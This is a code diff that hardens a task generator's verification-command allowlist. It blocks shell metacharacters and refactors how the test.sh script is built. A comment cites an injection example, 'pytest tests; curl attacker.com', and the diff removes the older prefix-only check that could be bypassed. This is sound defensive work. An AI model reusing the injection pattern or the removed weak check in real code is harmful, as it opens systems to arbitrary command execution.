@@ -266,6 +266,52 @@ _ALLOWED_COMMAND_PREFIXES = (
     "codeprobe oracle-check ",
 )
 
+# Characters that change shell control flow — any appearance blocks a
+# command from the allowlist even if the prefix matches, because a
+# crafted input like ``pytest tests; curl attacker.com`` passes the
+# prefix test and then executes arbitrary shell.
+_SHELL_METACHARACTERS = (";", "|", "&", "`", "$", "<", ">", "\n")
+
+
+def _validate_verification_command(cmd: str) -> None:
+    """Reject a verification command that doesn't match the strict allowlist.
+
+    Two conditions must hold:
+    1. The command must start with one of the known-safe prefixes.
+    2. The command must NOT contain any shell metacharacter. The earlier
+       prefix-only check was trivially bypassable by appending ``; curl …``
+       or similar payloads to an allowed prefix.
+    """
+    if not any(
+        cmd == prefix or cmd.startswith(prefix) for prefix in _ALLOWED_COMMAND_PREFIXES
+    ):
+        raise ValueError(f"Verification command not in allowlist: {cmd!r}")
+    for ch in _SHELL_METACHARACTERS:
+        if ch in cmd:
+            raise ValueError(
+                f"Shell metacharacter {ch!r} not allowed in verification command: "
+                f"{cmd!r}"
+            )
+
+
+def _build_test_script(cmd: str, repo_path: Path, *, header: str) -> str:
+    """Build a test.sh that cd's into ``TASK_REPO_ROOT`` with a mined fallback.
+
+    The executor sets ``TASK_REPO_ROOT`` to the per-run worktree (when one
+    is owned) so parallel dual runs cannot trample shared workspace state.
+    Legacy runs without the env var fall back to the mined ``repo_path``.
+    """
+    _validate_verification_command(cmd)
+    fallback = shlex.quote(str(repo_path))
+    return (
+        "#!/usr/bin/env bash\n"
+        "set -euo pipefail\n\n"
+        f"# {header}\n"
+        f"_CODEPROBE_REPO_DEFAULT={fallback}\n"
+        'cd "${TASK_REPO_ROOT:-$_CODEPROBE_REPO_DEFAULT}"\n'
+        f"{cmd}\n"
+    )
+
 
 def write_task_dir(
     task: Task,
@@ -372,18 +418,10 @@ def write_task_dir(
         _write_mcp_instruction_variant(task, task_dir, instruction)
 
     # Write tests/test.sh — validate command against allowlist prefixes
-    cmd = task.verification.command
-    if not any(
-        cmd == prefix or cmd.startswith(prefix) for prefix in _ALLOWED_COMMAND_PREFIXES
-    ):
-        raise ValueError(f"Verification command not in allowlist: {cmd!r}")
-    test_script = (
-        "#!/usr/bin/env bash\n"
-        "set -euo pipefail\n\n"
-        f"# Verification script for task {safe_id}\n"
-        f"# Run tests relevant to merge commit {safe_id}\n"
-        f"cd {shlex.quote(str(repo_path))}\n"
-        f"{task.verification.command}\n"
+    test_script = _build_test_script(
+        task.verification.command,
+        repo_path,
+        header=f"Verification script for task {safe_id}",
     )
     test_sh_path = tests_dir / "test.sh"
     test_sh_path.write_text(test_script, encoding="utf-8")
@@ -517,17 +555,10 @@ def _write_dual_task(
     (task_dir / "instruction.md").write_text(instruction, encoding="utf-8")
 
     # tests/test.sh — direct verification, validated against allowlist
-    cmd = task.verification.command
-    if not any(
-        cmd == prefix or cmd.startswith(prefix) for prefix in _ALLOWED_COMMAND_PREFIXES
-    ):
-        raise ValueError(f"Verification command not in allowlist: {cmd!r}")
-    test_script = (
-        "#!/usr/bin/env bash\n"
-        "set -euo pipefail\n\n"
-        f"# Direct verification for dual task {safe_id}\n"
-        f"cd {shlex.quote(str(repo_path))}\n"
-        f"{cmd}\n"
+    test_script = _build_test_script(
+        task.verification.command,
+        repo_path,
+        header=f"Direct verification for dual task {safe_id}",
     )
     test_sh_path = tests_dir / "test.sh"
     test_sh_path.write_text(test_script, encoding="utf-8")
